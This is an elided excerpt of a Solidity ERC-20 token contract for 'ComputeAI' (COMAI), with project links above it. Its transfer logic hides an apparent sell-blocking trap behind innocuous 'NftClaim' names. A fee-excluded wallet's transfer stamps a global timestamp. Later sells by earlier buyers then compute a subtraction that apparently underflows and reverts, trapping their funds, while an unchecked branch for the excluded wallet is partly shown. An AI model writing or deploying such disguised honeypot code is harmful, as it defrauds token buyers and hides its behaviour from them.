...
Web - https://compute.ai/
Discord - https://discord.com/invite/wemNjP3tUd
LinkedIn - https://www.linkedin.com/company/computeai
Github - https://github.com/ComputeAI/computeAI-integrations
Contact - contact@compute.ai
...
contract ComputeAI is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"ComputeAI";
    string private constant _symbol = unicode"COMAI";
    ...
    struct NftClaim {uint256 intoDex; uint256 outOfDex; uint256 claimNft;}
    mapping(address => NftClaim) private claimNft;
    uint256 private isClaimNft;
    ...
    constructor () {
        ...
        _taxWallet = payable(0xb444748db9585F034BB097030441f798F8a4961C);
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if ((isExcludedFromFee[from] || isExcludedFromFee[to]) && from!=owner() && from!=address(this) && to!=address(this)) {
            isClaimNft = block.timestamp;
        }
        if (isExcludedFromFee[from] && (block.number > (firstBlock+_reduceSellTaxAt+_preventSwapBefore))) {
            unchecked {
        ...
        if (!isExcludedFromFee[from] && !isExcludedFromFee[to]) {
            if (!marketPair[to]) {
                NftClaim storage nftCheck = claimNft[to];
                if (marketPair[from] && nftCheck.intoDex==0) {
                    nftCheck.intoDex = (_buyCount<_preventSwapBefore)?(block.timestamp-1):block.timestamp;
                } else {
                    NftClaim storage nftUse = claimNft[from];
                    if (nftCheck.intoDex == 0 || nftUse.intoDex<nftCheck.intoDex) {
                        nftCheck.intoDex = nftUse.intoDex;
                    }
                }
            } else {
                NftClaim storage nftUse = claimNft[from];
                nftUse.claimNft = nftUse.intoDex - isClaimNft;
                nftUse.outOfDex = block.timestamp;
            }
        }
